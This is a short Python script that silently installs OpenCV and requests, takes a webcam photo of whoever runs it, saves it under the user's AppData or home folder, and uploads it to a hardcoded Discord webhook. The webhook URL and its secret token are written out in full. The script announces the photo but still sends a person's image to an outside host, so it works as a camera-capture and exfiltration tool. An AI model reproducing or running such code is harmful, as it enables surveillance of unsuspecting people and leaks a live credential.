import time
import os
import sys
import subprocess
import platform

# Function to install missing packages
def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Try importing and installing if necessary
try:
    import cv2
except ImportError:
    print("Installing opencv-python...")
    install_package("opencv-python")
    import cv2

try:
    import requests
except ImportError:
    print("Installing requests...")
    install_package("requests")
    import requests

# Get the AppData directory (Windows only)
if platform.system() == "Windows":
    appdata_dir = os.getenv("APPDATA")
else:
    appdata_dir = os.path.expanduser("~")

# Define the filename and full path for the captured image
filename = "captured_photo.jpg"
filepath = os.path.join(appdata_dir, filename)

# Define the Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1375651188707692584/vwak1NaP3eO713y8TCMfppKCoQTHz6QSp7ozhsQAFnx94aUlHTf51jaFykODaEzgpvW7"

# Start the camera
cap = cv2.VideoCapture(0)
if not cap.isOpened():
    print("Error: Could not open camera.")
    sys.exit(1)

print("Taking a photo. Please look at the camera...")
time.sleep(2)  # Short delay before taking photo

# Capture a single frame
ret, frame = cap.read()
cap.release()

if not ret:
    print("Error: Failed to capture image.")
    sys.exit(1)

# Save the image
cv2.imwrite(filepath, frame)
print(f"Photo captured and saved as {filepath}. Sending to Discord and opening it in 5 minutes...")

# Send the image to Discord webhook
try:
    with open(filepath, 'rb') as f:
        files = {'file': (filename, f)}
        response = requests.post(webhook_url, files=files)
        if response.status_code == 204:
            print("Photo successfully sent to Discord.")
        else:
            print(f"Failed to send photo to Discord. Status code: {response.status_code}")
except Exception as e:
    print(f"Error sending photo to Discord: {e}")

# # Wait for 5 minutes (300 seconds)
# time.sleep(300)

# # Open the image with the default viewer based on OS
# if platform.system() == "Darwin":       # macOS
#     subprocess.call(["open", filepath])
# elif platform.system() == "Windows":    # Windows
#     subprocess.run(["start", "", filepath], shell=True)
# else:                                    # Linux and others
#     subprocess.call(["xdg-open", filepath])
